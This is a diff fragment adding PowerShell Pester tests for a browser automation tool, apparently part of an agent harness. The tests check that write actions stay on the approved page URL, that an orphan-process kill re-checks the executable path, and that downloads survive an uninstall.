+            $supervisor | Should -Match 'function assertSamePage'
+            foreach ($handler in 'fill', 'press', 'upload', 'download') {
+                $supervisor | Should -Match "async $handler\(\{[^}]*expectedUrl"
+            }
+        }
+
+        It 'the tool sends the approved page url with every write' {
+            $source = Get-Command Invoke-DpBrowserTool | ForEach-Object { $_.Definition }
+            ([regex]::Matches($source, 'expectedUrl = \$pageUrl')).Count | Should -Be 4
+        }
+    }
+
+    Context 'm-4 - a reused pid cannot redirect a tree kill' {
+        It 're-checks the executable path at the moment of the kill' {
+            $source = Get-Command Remove-DpBrowserOrphan | ForEach-Object { $_.Definition }
+            $source | Should -Match '\$current -ne \$orphan\.path'
+        }
+    }
+
+    Context 'm-7 - uninstalling the browser does not delete saved files' {
+        It 'downloads live outside the folder uninstall removes' {
+            $source = Get-Content -LiteralPath (Join-Path $PSScriptRoot '..' '..' 'source' 'Private' 'Invoke-DpTurn.ps1') -Raw
+            $source | Should -Match "browser-downloads"
+            $source | Should -Not -Match "Join-Path \`$browserRuntime\.runtimeRoot 'downloads'"
+        }
+    }
+}
+
+
+
+
+
 
 
 
